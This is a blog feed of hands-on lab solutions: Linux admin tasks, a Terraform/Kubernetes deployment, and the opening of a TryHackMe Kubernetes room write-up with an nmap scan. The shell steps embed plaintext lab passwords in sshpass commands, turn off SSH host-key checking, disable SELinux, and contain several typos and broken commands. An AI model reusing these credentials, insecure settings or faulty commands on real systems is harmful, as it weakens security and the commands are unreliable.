</span></span><span style="display:flex;"><span><span style="color:#75715e">#switch to root user</span>
</span></span><span style="display:flex;"><span>sudo su -
</span></span><span style="display:flex;"><span><span style="color:#75715e">#testing selinux</span>
</span></span><span style="display:flex;"><span>setatus
</span></span><span style="display:flex;"><span><span style="color:#75715e">#installing selinux</span>
</span></span><span style="display:flex;"><span>yum whatprovides selinux
</span></span><span style="display:flex;"><span>yum search selinux
</span></span><span style="display:flex;"><span><span style="color:#75715e">#install all the packages</span>
</span></span><span style="display:flex;"><span>yum install policycoreutils policycoreutils-python selinux-policy selinux-policy-targeted libselinux-utils setroubleshoot-server setools setools-console mcstrans
</span></span><span style="display:flex;"><span><span style="color:#75715e">#check selinux status</span>
</span></span><span style="display:flex;"><span>sestatus
</span></span><span style="display:flex;"><span><span style="color:#75715e">#set selinux mode to disabled</span>
</span></span><span style="display:flex;"><span>vi /etc/selinux/config <span style="color:#f92672">=</span>&gt; Change the SELINUX<span style="color:#f92672">=</span>enforcing to SELINUX<span style="color:#f92672">=</span>disabled
</span></span><span style="display:flex;"><span><span style="color:#75715e">#checking selinux status again</span>
</span></span><span style="display:flex;"><span>sestatus
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="create-cron-jon">Create Cron Jon</h2>
<ul>
<li>The Nautilus system admins team has prepared scripts to automate several day-to-day tasks. They want them to be deployed on all app servers in Stratos DC on a set schedule. Before that they need to test similar functionality with a sample cron job. Therefore, perform the steps below:</li>
<li>a. Install cronie package on all Nautilus app servers and start crond service.</li>
<li>b. Add a cron */5 * * * * echo hello &gt; /tmp/cron_text for root user.</li>
</ul>
<h6 id="solution-9">Solution:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span><span style="color:#75715e">#ssh to the app servers</span>
</span></span><span style="display:flex;"><span>sshpass -p &lt;password&gt; ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no &lt;user&gt;@stapp0<span style="color:#f92672">{</span>1,2,3<span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#switch to root user</span>
</span></span><span style="display:flex;"><span>sudo su -
</span></span><span style="display:flex;"><span><span style="color:#75715e">#install cron service</span>
</span></span><span style="display:flex;"><span>yum whatprovides crontab
</span></span><span style="display:flex;"><span>yum install cronie
</span></span><span style="display:flex;"><span><span style="color:#75715e">#start and enable the service</span>
</span></span><span style="display:flex;"><span>systemctl start cronie
</span></span><span style="display:flex;"><span>systemctl enable --now cronie
</span></span><span style="display:flex;"><span>systemctl status cronie
</span></span><span style="display:flex;"><span><span style="color:#75715e">#create a new cron job and copy the job given, the -u here arg is for user and is not actually necessary here</span>
</span></span><span style="display:flex;"><span>crontab -e -u root 
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verify</span>
</span></span><span style="display:flex;"><span>crontab -l
</span></span><span style="display:flex;"><span>cat /var/spool/cron/root
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="linux-remote-copy">Linux Remote Copy</h2>
<ul>
<li>One of the Nautilus developers has copied confidential data on the jump host in Stratos DC. That data must be copied to one of the app servers. Because developers do not have access to app servers, they asked the system admins team to accomplish the task for them.</li>
<li>Copy /tmp/nautilus.txt.gpg file from jump server to App Server 1 at location /home/webapp.</li>
</ul>
<h6 id="solution-10">Solution:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span><span style="color:#75715e">#check for the file in jump hose</span>
</span></span><span style="display:flex;"><span>ls /tmp
</span></span><span style="display:flex;"><span><span style="color:#75715e">#copy the file to the app server1</span>
</span></span><span style="display:flex;"><span>sudo scp -r /tmp/nautilus.txt.gpg tony@stapp01:/home/webapp
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verify</span>
</span></span><span style="display:flex;"><span>sshpass -p Ir0nM@n ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no tony@stapp01
</span></span><span style="display:flex;"><span>ls /home/webapp
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="linux-postfix-troubleshooting">Linux Postfix Troubleshooting</h2>
<ul>
<li>Some users of the monitoring app have reported issues with xFusionCorp Industries mail server. They have a mail server in Stork DC where they are using postfix mail transfer agent. Postfix service seems to fail. Try to identify the root cause and fix it.</li>
</ul>
<h6 id="solution-11">Solution:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span><span style="color:#75715e">#connect to the mail server</span>
</span></span><span style="display:flex;"><span>sshpass -p Gr00T123 ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no groot@stmail01
</span></span><span style="display:flex;"><span><span style="color:#75715e">#switch to the root user</span>
</span></span><span style="display:flex;"><span>sudo su -
</span></span><span style="display:flex;"><span><span style="color:#75715e">#start the postfix service</span>
</span></span><span style="display:flex;"><span>systemctl start postfix 
</span></span><span style="display:flex;"><span><span style="color:#75715e">#notice the error we get, lets dig into it and understand the root problem</span>
</span></span><span style="display:flex;"><span>systemctl status postifx -l
</span></span><span style="display:flex;"><span>journalctl -xe 
</span></span><span style="display:flex;"><span><span style="color:#75715e">#According to the logs, the error in Postfix occurred because the &#34;inet_interfaces&#34; parameter was set to both &#34;all&#34; and &#34;localhost,&#34; causing a conflict. This conflicting configuration resulted in a malfunction of the system.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#We can fix this by commenting &#34;inet_interfaces=localhost&#34; in /etc/postfix/main.cf</span>
</span></span><span style="display:flex;"><span>vi /etc/postfix/main.cf &gt; add <span style="color:#e6db74">&#34;#&#34;</span> to <span style="color:#e6db74">&#34;inet_interfaces=localhost&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#start the service</span>
</span></span><span style="display:flex;"><span>systemctl start postfix
</span></span><span style="display:flex;"><span>systemctl status postfix
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verify</span>
</span></span><span style="display:flex;"><span>telnet stmail01 <span style="color:#ae81ff">25</span>
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="linux-services">Linux Services</h2>
<ul>
<li>As per details shared by the development team, the new application release has some dependencies on the back end. There are some packages/services that need to be installed on all app servers under Stratos Datacenter. As per requirements please perform the following steps:</li>
<li>a. Install nscd package on all the application servers.</li>
<li>b. Once installed, make sure it is enabled to start during boot.</li>
</ul>
<h6 id="solution-12">Solution:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span><span style="color:#75715e">#ssh to the app servers one by one</span>
</span></span><span style="display:flex;"><span>sshpass -p &lt;password&gt; ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no &lt;name&gt;@stapp0<span style="color:#f92672">{</span>1,2,3<span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#switch to root user</span>
</span></span><span style="display:flex;"><span>sudo su -
</span></span><span style="display:flex;"><span><span style="color:#75715e">#search for the nscd package</span>
</span></span><span style="display:flex;"><span>yum search nscd
</span></span><span style="display:flex;"><span><span style="color:#75715e">#install the package</span>
</span></span><span style="display:flex;"><span>yum install nscd -y
</span></span><span style="display:flex;"><span><span style="color:#75715e">#start and enbale the service</span>
</span></span><span style="display:flex;"><span>systemctl status nscd
</span></span><span style="display:flex;"><span>systemctl enable --now nscd
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verify the service status</span>
</span></span><span style="display:flex;"><span>systemctl status nscd
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="linux-user-expiry">Linux User Expiry</h2>
<ul>
<li>A developer kirsty has been assigned Nautilus project temporarily as a backup resource. As a temporary resource for this project, we need a temporary user for kirsty. It’s a good idea to create a user with a set expiration date so that the user won&rsquo;t be able to access servers beyond that point.</li>
<li>Therefore, create a user named kirsty on the App Server 1. Set expiry date to 2021-02-17 in Stratos Datacenter. Make sure the user is created as per standard and is in lowercase.</li>
</ul>
<h6 id="solution-13">Solution:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span><span style="color:#75715e">#Connect to app server 1 </span>
</span></span><span style="display:flex;"><span>sshpass -p Ir0nM@n ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no tony@stapp01
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Switch to root user</span>
</span></span><span style="display:flex;"><span>sudo su -
</span></span><span style="display:flex;"><span><span style="color:#75715e">#create new user with expiry date</span>
</span></span><span style="display:flex;"><span>useradd -e 2021-02-17 kirsty
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verify</span>
</span></span><span style="display:flex;"><span>chage -l kirsty
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="disable-root-login">Disable Root Login</h2>
<ul>
<li>After doing some security audits of servers, xFusionCorp Industries security team has implemented some new security policies. One of them is to disable direct root login through SSH.</li>
<li>Disable direct SSH root login on all app servers in Stratos Datacenter.</li>
</ul>
<h6 id="solution-14">Solution:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span><span style="color:#75715e">#ssh to the app servers</span>
</span></span><span style="display:flex;"><span>sshpass -p &lt;password&gt; ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no &lt;user&gt;@&lt;host&gt;
</span></span><span style="display:flex;"><span><span style="color:#75715e">#switch to the root user</span>
</span></span><span style="display:flex;"><span>sudo su -
</span></span><span style="display:flex;"><span><span style="color:#75715e">#edit the sshd_config file</span>
</span></span><span style="display:flex;"><span>vi /etc/ssh/sshd_config
</span></span><span style="display:flex;"><span>add <span style="color:#e6db74">&#34;PermitRootLogin no&#34;</span> and save the file and quit
</span></span><span style="display:flex;"><span><span style="color:#75715e">#restart ssh daemon </span>
</span></span><span style="display:flex;"><span>systemctl restart sshd
</span></span><span style="display:flex;"><span>systemctl status sshd
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="linux-banner">Linux Banner</h2>
<ul>
<li>During the monthly compliance meeting, it was pointed out that several servers in the Stratos DC do not have a valid banner. The security team has provided serveral approved templates which should be applied to the servers to maintain compliance. These will be displayed to the user upon a successful login.</li>
<li>Update the message of the day on all application and db servers for Nautilus. Make use of the approved template located at /home/thor/nautilus_banner on jump host</li>
</ul>
<h6 id="solution-15">Solution</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span><span style="color:#75715e">#scp is not installed in the db server, lets first install it first.</span>
</span></span><span style="display:flex;"><span>sshpass -p Sp<span style="color:#ae81ff">\!</span>dy ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no peter@stdb01
</span></span><span style="display:flex;"><span><span style="color:#75715e">#switch to the root user and install the required package</span>
</span></span><span style="display:flex;"><span>sudo su -
</span></span><span style="display:flex;"><span>yum whatprovides scp
</span></span><span style="display:flex;"><span>yum install openssh-clients -y
</span></span><span style="display:flex;"><span><span style="color:#75715e">#now CTRL^D twice and go back to the jump host to copy the template.</span>
</span></span><span style="display:flex;"><span>scp nautilus_banner peter@stdb01:/tmp/motd
</span></span><span style="display:flex;"><span>scp nautilus_banner tony@stapp01:/tmp/motd
</span></span><span style="display:flex;"><span>scp nautilus_banner steve@stapp02:/tmp/motd
</span></span><span style="display:flex;"><span>scp nautilus_banner banner@stapp03:/tmp/motd
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ssh again to the server</span>
</span></span><span style="display:flex;"><span>sshpass -p Sp<span style="color:#ae81ff">\!</span>dy ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no peter@stdb01
</span></span><span style="display:flex;"><span><span style="color:#75715e">#move the /tmp/motd file to /etc/motd</span>
</span></span><span style="display:flex;"><span>sudo mv /tmp/motd /etc/motd
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verify</span>
</span></span><span style="display:flex;"><span>cat /etc/motd
</span></span><span style="display:flex;"><span><span style="color:#75715e">#CTRL^D twice and reconnect to the server via ssh to see the changes.</span>
</span></span><span style="display:flex;"><span>sshpass -p Sp<span style="color:#ae81ff">\!</span>dy ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no peter@stdb01
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Redo the same process on all app servers.</span>
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="cron-schedule-deny-to-users">Cron schedule deny to users</h2>
<ul>
<li>To stick with the security compliances, the Nautilus project team has decided to apply some restrictions on crontab access so that only allowed users can create/update the cron jobs. Limit crontab access to below specified users on App Server 1.</li>
<li>Allow crontab access to mariyam user and deny the same to ryan user.</li>
</ul>
<h6 id="solution-16">Solution</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span>sshpass -p Ir0nM@n ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no tony@stapp01
</span></span><span style="display:flex;"><span><span style="color:#75715e">#restrict user ryna from using crontab</span>
</span></span><span style="display:flex;"><span>sudo echo <span style="color:#e6db74">&#34;ryan&#34;</span> &gt; /etc/cron.deny
</span></span><span style="display:flex;"><span><span style="color:#75715e">#allow user mariyam </span>
</span></span><span style="display:flex;"><span>sudo echo <span style="color:#e6db74">&#34;mariyam&#34;</span> &gt; /etc/cron.allow
</span></span><span style="display:flex;"><span><span style="color:#75715e">#restart crond service </span>
</span></span><span style="display:flex;"><span>sudo systemctl restart crond
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verify</span>
</span></span><span style="display:flex;"><span>su ryan
</span></span><span style="display:flex;"><span>crontab -l <span style="color:#75715e">#you should get  the following message</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;You ryan are not allowed to use this program (crontab).&#34;</span>
</span></span></code></pre></div></li>
</ul>
<h2 id="linux-firewalld-rules">Linux Firewalld Rules</h2>
<ul>
<li>The Nautilus system admins team recently deployed a web UI application for their backup utility running on the Nautilus backup server in Stratos Datacenter. The application is running on port 5001. They have firewalld installed on that server. The requirements that have come up include the following:</li>
<li>Open all incoming connection on 5002/tcp port. Zone should be public</li>
</ul>
<h6 id="solution-17">Solution</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span>sshpass -p H@wk3y3 ssh -o StrictHostKeyChecking clint@stbkp01
</span></span><span style="display:flex;"><span><span style="color:#75715e">#check</span>
</span></span><span style="display:flex;"><span>curl localhost:5002
</span></span><span style="display:flex;"><span><span style="color:#75715e">#open port</span>
</span></span><span style="display:flex;"><span>sudo firewall-cmd --permanent --add-port<span style="color:#f92672">=</span>5002/tcp --zone<span style="color:#f92672">=</span>public
</span></span><span style="display:flex;"><span><span style="color:#75715e">#reload</span>
</span></span><span style="display:flex;"><span>sudo firewall-cmd --reload
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verify</span>
</span></span><span style="display:flex;"><span>sudo firewall-cmd --list-ports
</span></span><span style="display:flex;"><span>curl localhost:5002
</span></span></code></pre></div></li>
</ul>
]]></content></item><item><title>Terraform Challenge Series - Challenge 1</title><link>https://chxmxii.github.io/portfolio/posts/2023/03/terraform-challenge-series-challenge-1/</link><pubDate>Sun, 26 Mar 2023 00:00:00 +0000</pubDate><guid>https://chxmxii.github.io/portfolio/posts/2023/03/terraform-challenge-series-challenge-1/</guid><description>In this challenge we will deploy several Kubernetes resources using terraform. Utilize /root/terraform_challenge directory to store your Terraform configuration files. Note: kubectl is already installed on the host, you can check your deployments in the usual way.
Architecture : Solution : Controlplane We will start by installing terraform in the controlplane node apt update apt install unzip -y curl -L -o /tmp/terraform_1.1.5_linux_amd64.zip https://releases.hashicorp.com/terraform/1.1.5/terraform_1.1.5_linux_amd64.zip unzip -d /usr/local/bin /tmp/terraform_1.1.5_linux_amd64.zip which terraform terrafomr --version cd /root/terraform_challenge Kubernetes-provider for the kubernets provider we will configure it within provider.</description><content type="html"><![CDATA[<p>In this challenge we will deploy several Kubernetes resources using terraform.
Utilize /root/terraform_challenge directory to store your Terraform configuration files.
Note: kubectl is already installed on the host, you can check your deployments in the usual way.</p>
<h4 id="architecture-">Architecture :</h4>
<p><img src="/files/chall1.png#center" alt=""></p>
<h4 id="solution-">Solution :</h4>
<h5 id="controlplane">Controlplane</h5>
<ul>
<li>We will start by installing terraform in the controlplane node</li>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span>apt update
</span></span><span style="display:flex;"><span>apt install unzip -y
</span></span><span style="display:flex;"><span>curl -L -o /tmp/terraform_1.1.5_linux_amd64.zip https://releases.hashicorp.com/terraform/1.1.5/terraform_1.1.5_linux_amd64.zip
</span></span><span style="display:flex;"><span>unzip -d /usr/local/bin /tmp/terraform_1.1.5_linux_amd64.zip
</span></span><span style="display:flex;"><span>which terraform
</span></span><span style="display:flex;"><span>terrafomr --version
</span></span><span style="display:flex;"><span>cd /root/terraform_challenge
</span></span></code></pre></div></li>
</ul>
<hr>
<h5 id="kubernetes-provider">Kubernetes-provider</h5>
<ul>
<li>for the kubernets provider we will configure it within provider.tf file.</li>
<li>You can refer to the documentation for this provider, simply go to <a href="https://registry.terraform.io/">Terraform Registry</a> and search for hashicorp/kubernetes.</li>
<li>Click on USE PROVIDER button and copy the snippet into provider.tf</li>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-terraform" data-lang="terraform"><span style="display:flex;"><span><span style="color:#a6e22e">terraform</span> {
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">required_providers</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">kubernetes</span> = {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">source</span> = <span style="color:#e6db74">&#34;hashicorp/kubernetes&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">version</span> = <span style="color:#e6db74">&#34;2.11.0&#34;</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">provider</span> <span style="color:#e6db74">&#34;kubernetes&#34;</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">config_path</span>    = <span style="color:#e6db74">&#34;/root/.kube/config&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div></li>
</ul>
<p>Now, we can initialize the provider</p>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>terraform init
</span></span></code></pre></div></li>
</ul>
<hr>
<h5 id="frontend">frontend</h5>
<ul>
<li>Create a terraform resource frontend for kubernetes deployement, you can refere to the documentation for <a href="https://registry.terraform.io/providers/hashicorp/kubernetes/2.11.0/docs/resources/deployment">Kubernetes_deployment</a>.</li>
<li>If you are familiar with kubernetes, you can see that the resource shema is arranged similarly to the corresponding YAML manifest.</li>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-terraform" data-lang="terraform"><span style="display:flex;"><span><span style="color:#66d9ef">  resource</span> <span style="color:#e6db74">&#34;kubernetes_deployment&#34;</span> <span style="color:#e6db74">&#34;frontend&#34;</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">metadata</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">name</span> = <span style="color:#e6db74">&#34;frontend&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">labels</span> = {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">name</span> = <span style="color:#e6db74">&#34;frontend&#34;</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">spec</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">replicas</span> = <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">selector</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">match_labels</span> = {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">name</span> = <span style="color:#e6db74">&#34;webapp&#34;</span>
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">template</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">metadata</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">labels</span> = {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">name</span> = <span style="color:#e6db74">&#34;webapp&#34;</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">spec</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">container</span> {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">image</span> = <span style="color:#e6db74">&#34;kodekloud/webapp-color:v1&#34;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">name</span>  = <span style="color:#e6db74">&#34;simple-webapp&#34;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">port</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">container_port</span> = <span style="color:#ae81ff">8080</span>
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div></li>
</ul>
<hr>
<h5 id="webapp-service">webapp-service</h5>
<ul>
<li>Create terraform resouce webapp-service for kubernetes service, you can always refere to the provider documentation for <a href="https://registry.terraform.io/providers/hashicorp/kubernetes/2.11.0/docs/resources/service">kubernetes_service</a>.</li>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Terraform" data-lang="Terraform"><span style="display:flex;"><span><span style="color:#66d9ef">  resource</span> <span style="color:#e6db74">&#34;kubernetes_service&#34;</span> <span style="color:#e6db74">&#34;webapp-service&#34;</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">metadata</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">name</span> = <span style="color:#e6db74">&#34;webapp-service&#34;</span>
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">spec</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">selector</span> = {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">name</span> = <span style="color:#a6e22e">kubernetes_deployment</span>.<span style="color:#a6e22e">frontend</span>.<span style="color:#a6e22e">spec</span>.<span style="color:#ae81ff">0</span>.<span style="color:#a6e22e">template</span>.<span style="color:#ae81ff">0</span>.<span style="color:#a6e22e">metadata</span>.<span style="color:#ae81ff">0</span>.<span style="color:#a6e22e">labels</span>.<span style="color:#a6e22e">name</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">port</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">port</span>        = <span style="color:#ae81ff">8080</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">target_port</span> = <span style="color:#ae81ff">8080</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">node_port</span>   = <span style="color:#ae81ff">30080</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">type</span> = <span style="color:#e6db74">&#34;NodePort&#34;</span>
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div></li>
</ul>
<hr>
<h6 id="deploy-the-kubernetes-resources">Deploy the kubernetes resources</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>terraform plan
</span></span><span style="display:flex;"><span>terraform apply
</span></span></code></pre></div></li>
</ul>
]]></content></item><item><title>Kubernetes for everyone</title><link>https://chxmxii.github.io/portfolio/posts/2022/12/kubernetes-for-everyone/</link><pubDate>Sun, 11 Dec 2022 00:00:00 +0000</pubDate><guid>https://chxmxii.github.io/portfolio/posts/2022/12/kubernetes-for-everyone/</guid><description>Hola, a friend of mine thought it&amp;rsquo;d be cool for me to check out this room on the THM platform since they know I&amp;rsquo;m really into Kubernetes and security. I thought it sounded like a fun idea, so I jumped right in! Room link: https://tryhackme.com/jr/kubernetesforyouly
Okay, so I kicked things off by giving the IP address a scan, hoping to stumble upon something cool or significant. And you know what? My instincts were right on the money – I actually discovered two apps listening on ports 5000 and 3000!</description><content type="html"><![CDATA[<p>Hola, a friend of mine thought it&rsquo;d be cool for me to check out this room on the THM platform since they know I&rsquo;m really into Kubernetes and security. I thought it sounded like a fun idea, so I jumped right in!
<img src="/files/k8s.png#center" alt=""></p>
<blockquote>
<p>Room link: <a href="https://tryhackme.com/jr/kubernetesforyouly">https://tryhackme.com/jr/kubernetesforyouly</a></p>
</blockquote>
<hr>
<p>Okay, so I kicked things off by giving the IP address a scan, hoping to stumble upon something cool or significant. And you know what? My instincts were right on the money – I actually discovered two apps listening on ports 5000 and 3000!</p>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ nmap -F 10.10.55.59
</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-08-16 11:07 EDT
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.55.59
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.16s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">96</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
</span></span><span style="display:flex;"><span>22/tcp   open  ssh
</span></span><span style="display:flex;"><span>111/tcp  open  rpcbind
</span></span><span style="display:flex;"><span>3000/tcp open  ppp
</span></span><span style="display:flex;"><span>5000/tcp open  upnp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 0.85 seconds
</span></span></code></pre></div></li>
</ul>
<p>I excitedly launched my web browser and entered the &ldquo;<!-- raw HTML omitted -->:5000&rdquo;. And guess what? I came across this super fun game called &ldquo;Etch A Sketch&rdquo;!</p>
<ul>
<li><img src="/files/sketch.png#center" alt=""></li>
</ul>
<p>However, during my search, I stumbled upon the &lsquo;main.css&rsquo; file. To my surprise, I discovered a Pastebin link within it. Upon opening the link, I was greeted with a base32 encoded string.
But you know what really caught my attention? While I was looking around, I spotted something interesting in the &lsquo;main.css&rsquo; file. It was a Pastebin link! Curiosity piqued, I followed the link and found a base32 encoded string waiting for me. Exciting stuff!</p>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">url</span>(<span style="color:#e6db74">&#34;https://fonts.googleapis.com/css2?family=Bowlby+One+SC&amp;display=swap&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* @import url(&#34;https://pastebin.com/cPs69B0y&#34;); */</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">url</span>(<span style="color:#e6db74">&#34;https://fonts.googleapis.com/css2?family=Vollkorn:wght@500&amp;display=swap&#34;</span>);
</span></span></code></pre></div></li>
</ul>
